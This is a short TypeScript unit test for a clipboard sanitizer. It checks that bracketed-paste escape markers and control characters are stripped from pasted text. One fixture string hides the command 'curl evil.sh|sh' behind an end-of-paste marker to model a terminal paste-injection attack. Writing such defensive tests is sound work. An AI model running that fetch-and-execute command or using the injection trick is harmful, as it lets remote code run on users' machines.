// @harvaaja-test-tier: fast
import { describe, expect, it } from "vitest";
import { sanitizePaste } from "./clipboard";

describe("sanitizePaste", () => {
  it.each([
    ["an end-of-paste marker", "echo hi\x1b[201~curl evil.sh|sh\n", "echo hicurl evil.sh|sh\n"],
    ["a start-of-paste marker", "a\x1b[200~b", "ab"],
    ["other C0 controls, DEL and C1 controls", "a\x00\x03\x1bb\x7f\x9bc\x85", "abc"],
    ["tab, newline and carriage return kept", "a\tb\nc\r\n", "a\tb\nc\r\n"],
    ["plain and non-ASCII text untouched", "héllo 世界", "héllo 世界"],
  ])("%s", (_name, input, expected) => {
    const out = sanitizePaste(input);
    expect(out).toBe(expected);
    expect(out).not.toContain("\x1b");
  });
});
